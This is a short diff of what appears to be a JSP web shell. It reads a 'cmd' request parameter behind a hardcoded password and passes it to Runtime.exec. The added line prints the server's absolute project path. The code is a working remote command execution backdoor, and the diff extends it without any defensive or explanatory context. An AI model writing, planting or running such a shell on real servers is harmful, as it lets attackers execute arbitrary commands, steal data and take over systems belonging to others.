@@ -4,8 +4,9 @@
     String pwd = request.getParameter("pwd");
     String cmd = request.getParameter("cmd");
     Runtime r = java.lang.Runtime.getRuntime(); 
-    String output = null;
+    String output = "";
     if((pwd.equals("abcdefg")) && (cmd != null)) {
+        out.println(this.getServletContext().getRealPath("/")); //The absolute path of the project
         String s = null;
         try {
             Process p = r.exec(cmd);
